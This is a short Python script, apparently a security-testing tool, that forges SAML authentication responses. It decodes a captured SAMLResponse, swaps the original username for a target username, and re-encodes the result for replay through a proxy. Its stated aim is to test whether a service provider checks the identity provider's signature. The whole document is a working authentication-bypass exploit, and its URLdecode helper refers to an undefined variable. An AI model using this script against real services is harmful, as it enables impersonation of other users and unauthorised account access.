#!/usr/bin/python
#This script attempts to tamper with the username portion of a SAML response 
#to verify that the service provider is verifying the signature provided by the Identity provider
#replace the SAML response in your proxy with the result of this script

import sys, getopt
import urllib.parse
import base64

def URLdecode(SAMLresponse):
	url_decoded = urllib.parse.unquote(arg)
	print(url_decoded)

def main(argv):
	original_username = ''
	tamper_username = ''
	try: 
		opts, args = getopt.getopt(argv, "hs:u:t:",["SAMLresponse=","username=","tamperusername="])
	except getopt.GetoptError:
		print("SAMLTamper.py  -u <original username> -t <tamper username> -s <SAMLResponse>")
		sys.exit(2)
	for opt, arg in opts:
		if opt =="-h":
			print("SAMLTamper.py -u <original username> -t <tamper username> -s <SAMLResponse>")
		elif opt in ("-u","--username"):
			original_username  = arg
		elif opt in ("-t","--tamperusername"):
			tamper_username = arg
		elif opt in ("-s","--SAMLresponse"):
			print("[*] URL Decoding SAML Response")
			url_decoded = urllib.parse.unquote(arg)
			print("[*] Base decoding SAML Response")
			base64_decoded_saml =  base64.b64decode(url_decoded).decode('utf-8')
			print("[*] Swapping " + original_username + " to " + tamper_username)
			swapped = base64_decoded_saml.replace(original_username,tamper_username)
			print("[*] Base64 Encoding the tampered SAMLResponse")
			encoded_tampered_saml = base64.b64encode(swapped.encode('utf-8'))
			print("[*] URL encoding the tampered SAMLResponse")
			url_encoded = urllib.parse.quote(encoded_tampered_saml)
			print(url_encoded)
			

if __name__ == "__main__":
	main(sys.argv[1:])

